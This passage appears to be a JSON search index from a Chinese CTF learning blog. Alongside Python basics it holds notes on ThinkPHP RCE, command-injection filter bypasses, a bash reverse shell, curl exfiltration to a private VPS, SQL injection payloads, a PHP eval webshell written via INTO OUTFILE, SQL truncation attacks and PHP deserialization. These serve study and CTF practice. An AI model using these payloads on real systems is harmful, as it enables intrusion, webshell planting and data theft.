}定义，内容为：下标名:元素内容\n\n<!--more-->\n\n#### 字符串相关函数：\n\n###### 查找：\n\n```python\nstr.find(str1,start,end)//rfind从末尾开始查找\nstr.index(str1,start,end)//rindex从末尾开始查找\n```\n\n在字符串中查找是否存在str1，存在返回第一次出现的位置，不存在find返回-1，index报错\n\n```python\nstr.count(str1,start,end)\n```\n\n查找字符串中某字符串出现的次数\n\n###### 替换：\n\n```python\nstr.replace(old,new,count)\n```\n\n将字符串中old内容替换为new，count为最大替换次数，返回新字符串，不改变原来字符串\n\n###### 切割：\n\n```python\nstr.split(str1,count)\n```\n\n将字符串以str1为分隔切割，count为最大切割次数，返回一个列表，不改变原有字符串，默认按空白字符进行全切割\n\n###### 加入：\n\n```python\nstr.join(可迭代对象)\n```\n\n将str插入到可迭代对象两个元素之间，返回一个字符串\n\n###### 乱七八糟：\n\n```python\ncapitalize(str)//将字符串中第一个字母大写\ntitle(str)//字符串中每个单词首字母大写\nstr.startwith(str1)//检查字符串是否以str1开头\nstr.endwith(str1)//检查字符串是否以str1结尾\nstr.upper()//字母全大写\nstr.lower()//字母全小写\n```\n\n\n\n\n\ninput输入\n\nprint输出\n\nread读文件（按字节读），readline（按行读）\n\nopen(\"文件名\"，\"打开方式（r只读，w写入，a追加，（b）代表以二进制打开，（+）代表读写）\"，encoding=\"编码方式\")打开文件（以二进制进行读写时不能指定encoding方式）\n\n*args不定长参数，接收后生成元组\n\n**kwargs不定长参数，接收后生成字典\n\n#### Python内存管理机制：引用计数\n\n```python\na=1 #a地址引用为1\nb=a #a地址引用为2\ndel a #a地址引用为1\ndel b #a地址引用为0，此时a引用地址被销毁\n```\n\n","tags":["Python"]},{"title":"模版漏洞","url":"/posts/29600.html","content":"\n# 模版漏洞\n\n### ThinkPHP V5漏洞：\n\n```url\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=PHP函数名&vars[1][]=PHP函数参数1&vars[1][]=PHP函数参数2\n```\n\n该漏洞可用于执行PHP函数\n\n<!--more-->\n","tags":["Note","CTF","web"]},{"title":"RCE远程代码执行","url":"/posts/47881.html","content":"\n# **RCE远程代码执行**\n\n#### **一、RCE能做到什么：**\n\n1、执行系统命令 2、记录用户输入 3、控制键盘鼠标 4、任意上传下载 5、截屏\n\n<!--more-->\n\n#### **二、RCE产生原因：**\n\n1、服务器上有木马 \n\n2、脆弱服务未授权\n\n3、通过数据库写木马 \n\n4、文件上传/文件包含 \n\n5、危险函数（eval，assert，system，shell_exec，exec，file_put_contents） \n\n6、命令执行 \n\n7、反序列化\n\n#### **三、RCE远程代码执行关键点：**\n\n##### **1、RCE黑名单过滤：**\n\nlinux执行命令特殊字符：（;分割命令）（&&在前一个命令执行成功的前提下执行后面命令）（||前一个命令执行失败的前提下执行后面命令）（|将前面命令执行的结果作为输入，输入到后面命令中执行）（``将命令执行结果作为命令再次执行）（$()和前一个一样）\n\n过滤空格后可使用<向命令传入参数，${IFS}为空格，%0a为分号转译\n\n`cat绕过可使用tac more less head tac tail nl od(二进制查看) vi vim sort uniq`\n\n`绕过空格用%09 <> ${IFS} $IFS$9 {cat,fl*} %20`\n\n`flag绕过可使用通配符f*`\n\n##### **2、RCE无回显：**\n\n（1）、反弹shell：攻击端监听一个端口如：2333 \n\n​\t攻击端使用：\n\n```shell\nnc -lvp 监听的端口\n```\n\n​\t受害端使用如下命令生成一个反弹shell：\n\n```shell\nbash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\n```\n\n​\t在攻击端终端即可在受害端中执行命令\n\n（2）、dnslog：通过ping $(命令).域名 通过这种方式获取命令执行结果\n\n（3）、写文件：将命令执行结果写入到文件中，使用echo命令：\n\n```shell\necho \"写入内容\">test.txt\n```\n\n（4）、curl等网络命令：通过POST等方式直接给到个人私有VPS中\n\n```shell\ncurl -d \"key1=value1&key2=value2&key3=value3\" protocol://ip:port/path\n```\n\n##### **3、RCE后发现不出网**\n\n（1）、写文件\n\n（2）、命令盲注：命令||sleep 100\n\n（3）、隐蔽信道\n\n##### 4、字符绕过\n\n（1）、\n\n```\n使用''或\"\"隔断字符串\n```\n\n（2）、空格可使用：<，<>，${IFS}，$IFS，%20(space)，%09(tab)，$IFS$9，$IFS$1 替换\n\n（3）、分号可使用：%0a，%0d，%0D，%0A 替换\n\n（4）、使用base64编码：Y2F0IGZsYWcucGhw|base64，将其中内容解码后执行\n\n（5）、使用`反引号包裹命令，将其中内容作为前一命令的输入\n\n##### 5、可用于执行系统命令的函数\n\nexec()、passthru()、system()、shell_exec()\n","tags":["Note","web","RCE"]},{"title":"SQL注入笔记","url":"/posts/26213.html","content":"\n# **SQL注入**\n\n1、通过order by爆出字段数\n\n2、union操作，联合查询，查询的是在同一个数据表的数据，通过union select 1,2,3…,n来判断回显位置\n\n3、information_schema数据库，为mysql自带数据库，提供数据库源数据访问，最常用的是\n\n**TABLES表**：提供了关于数据库中表的信息\n\n**COLUMNS表**：提供了表中列的信息\n\n<!--more-->\n\n爆破库名：\n\n```mysql\nunion select 1,2,database()\n//靠错误爆出库名\nand exists(select * from aaa)\n//aaa表并不存在，此时会报错停止并返回数据库名.aaa\n```\n\n爆破表名：\n\n```mysql\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\nand exists(select * from 表名)//爆破出表名\n```\n\n爆破列名：\n\n```mysql\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"想查询的表名\"\nand exists(select 列名 from 已知表名)//爆破出列名\n```\n\n4、报错注入\n\n（1）updatexml：更新XML文档的函数\n\n语法：**updatexml（文档类型，xpath路径，更新的内容）**\n\n例子：\n\n```mysql\nand updatexml(0x0a,concat(0x0a,(select database())),’1’)\n```\n\n0x0a代表换行符，concat拼接\n\n拼接目的为使得查询结果能完全显示出来\n\n（2）extractvalue：对XML文档进行查询的函数\n\n语法：**extractvalue（文档类型，xpath路径）**\n\n报错原理：路径中写入不合法的格式，就会报错并且返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容\n\n```mysql\nand (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))\n```\n\n提示：报错最长显示30个字符内容，如果内容过长可使用substr函数进行拆分\n\n​\t例题：CTFHub技能树web-SQL注入-报错注入\n\n​\t![SQLError](/images/quiz/SQLError.png)\n\n​\t首先爆破库表列名\n\n​\t![SQLError2](/images/quiz/SQLError2.png)\n\n​\t进而发现flag过长用substr切割\n\n​\t![SQLError3](/images/quiz/SQLError3.png)\n\n​\t得到flag\n\n5、盲注：\n\n布尔盲注：回显只有两种情况，一种有一种无\n\nif表达式：if(expr1,expr2,expr3)\n\nexpr1为真就返回expr2（可用于执行函数）\n\nsubstr函数：substr(字符串,起始位置,截取长度)\n\nascii函数：将函数内字符以ascii表转换为数字，而后可以进行判断\n\n\n\n时间盲注：无回显，可以通过sleep函数判断是否为时间盲注\n\n~~建议直接sqlmap~~\n\n（1）、sleep函数看延迟时间\n\n（2）、benchmark(执行次数,方式)，执行超多次看延迟时间\n\n6、堆叠注入：通过语句分割符号（  ;  ）分隔多条语句，直接将想要的数据插入到表中，然后再通过查询语句读取\n\n7、mysql文件读写：读取：load_file函数：load_file(‘文件路径’)\n\n写入：\n\n```mysql\nselect ‘<?php eval($_POST[cmd]);?>’ into outfile或dumpfile '绝对路径';//建议用dumpfile，因为outfile会在文件末行写入新行，使用的转译换行符，会破坏文件完整性，可能导致一句话木马无法执行\n```\n\n8、关键词绕过：通过\n\n（1）、set@a：设定一个语句变量 set@sql=0x16进制数\n\n（2）、prepare : 存储一个sql语句 存到execsql 里面 prepare execsql from @sql\n\n（3）、execute :执行一个sql语句 execute execsql\n\n由于设定语句变量时，mysql会自动将16进制数据转换为文字\n\n9、零碎\n\n```mysql\nto_base64(内容)//该语句将内容经过base64编码后输出\nreplace(ori,old,new)\n```\n\n```\n%0a,/**/可代替空格\n```\n\n```\n--+，%23，#将后面的语句注释\n```\n\n10、SQL约束攻击\n\n在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。例如如下代码：\n\n```sql\nSELECT userId from user where username = 'test            '//看这里有很多空格\n```\n\n上述代码和username = 'test'结果是一样的。但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“**字符串比较**”期间进行的。这是因为，**SQL会在内部使用空格来填充字符串**，**以便在比较之前使其它们的长度保持一致**。\n\n在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅插入字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“testName”时，实际上只能插入字符串的前5个字符，即“testN”。\n\n```php\n//注册示例代码\n<?php\n$username = mysql_real_escape_string($_GET['username']);\n$password = mysql_real_escape_string($_GET['password']);\n$query = \"SELECT *\n          FROM users\n          WHERE username='$username'\";\n$res = mysql_query($query, $database);\nif($res) {\n  if(mysql_num_rows($res) > 0) {\n  }\n  else {\n    $query = \"INSERT INTO users(username, password)\n?>\n```\n\n这里注册时使用用户名+【大量空格】和随机密码注册即可完成攻击。\n\n主要原理就是insert时候有varchar(n)的限制，大于n的时候会截取前n个存入。在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致。注册时select语句不会将\"admin+[大量空格]11\"删减到n位，所以不会被select查出与admin重复，不会返回数据，接下来就可以插入admin+[空格]（截取）11和自定义密码了。\n\n如果使用用户名“vampire”和密码“random_pass”登录的话，对比时是admin与admin+[大量空格]，会将前面的admin添加空格与后面的长度相同在进行对比，那么返回的只能是我们自己注册的用户信息，而不会返回目标用户信息。SQL查询语句是一个and操作，如果密码不一样怎么会把目标用户的信息也返回回来?\n\n当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注册的账户信息，但是注意此处的return $username，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。\n\n\n\n\n\n**HANDLER语句查询**\n\n出自该题[GYCTF2020]Blacklist，类似于某道堆叠注入的进阶版，但是该题过滤太多了，之前那道题的payload完全不可用了\n\n```\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n知识点：handler语句查询\n\n```mysql\n\nHANDLER tbl_name OPEN [ [AS] alias]\n \nHANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ { FIRST | NEXT }\n    [ WHERE where_condition ] [LIMIT ... ]\n \nHANDLER tbl_name CLOSE\n\n```\n\n构造出语句如下\n\n```\npayload:\n1';use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#\n```\n\n\n\n\n\n\n\ndistinct+列名可以去除重复值\n","tags":["Note","web","SQL"]},{"title":"CTF零碎笔记","url":"/posts/11612.html","content":"\n# 零碎笔记\n\nmt_srand( )该函数在PHP4.2.0之前传入任意参数后生成的都是伪随机数，在任何机器上只要运行的同样的seed参数结果都相同，有工具可以爆破\n\n<!--more-->\n\nKindEditor编辑器漏洞，在使用该编辑器是在url末尾加上/php/file_manager_json.php?path=路径，就会便利路径中所有内容，特征为前端代码中有对php/file_manager_json.php的引用\n\n###### md5弱相等绕过：\n\n1、构造数组a[]=xxxx&b[]=xxxx\n\n2、弱相等时转换为相同数据类型，0e开头的字符串会被转为0，字符串如下\n\n```\nQNKCDZO//0e830400451993494058024219903391\ns878926199a//0e545993274517709034328855841020\ns155964671a//0e342768416822451524974117254469\ns214587387a//0e848240448830537924465865611904\ns214587387a//0e848240448830537924465865611904\ns878926199a//0e545993274517709034328855841020\ns1091221200a//0e940624217856561557816327384675\n```\n\n\n\n## 序列化与反序列化：\n\n#### 序列化：\n\n将一个对象转化为一个有序的字符串\n\n#### 序列化格式：\n\n结构类型:\n\n```php\n对象名长度:\"对象名\":类中项目数量:{项目1类型:项目1长度:”项目1内容”;项目2类型:项目2长度:”项目2内容”;} \n```\n\n例子：\n\n```php\nO:4:\"xctf\":2:{s:4:\"flag\";s:3:\"111\";}\n//O代表对象类型，s代表字符串类型\n```\n\n#### 序列化有关函数：\n\n```php\nserialize(对象)//将对象进行序列化，返回一个字符串\n```\n\n```php\nunserialize(字符串)//将对应字符串进行反序列化操作，返回一个类\n```\n\n```php\n__wakeup()//该函数为类内函数，如果序列化中对象属性个数的值大于真是个数时就会跳过该函数执行\t\n```\n\n```PHP\n__construct\n// 触发条件，构造函数，当构造一个对象时调用。\n// 对象创建时销毁\n__destruct\n// 触发条件，析构函数，对象销毁时被调用。\n// 序列化时会销毁一次，对象销毁时执行，序列化输出前运行，但不影响序列化内容\n__unserialize\n// 触发条件，7.4版本以上，反序列化时出发，且可以绕过__wakeup\n__sleep()\n// 在对象被序列化之前运行\n__wakeup()\n// 在对象被反序列化之后被调用\n__invoke\n// 当对象被调用时执行\n// 函数形式调用对象时，触发的方法\n```\n\n","tags":["Note","web"]},{"title":"CTF","url":"/posts/58958.html","content":"\nJlan的CTF之旅从现在开始了\n\n","tags":["Note"]}]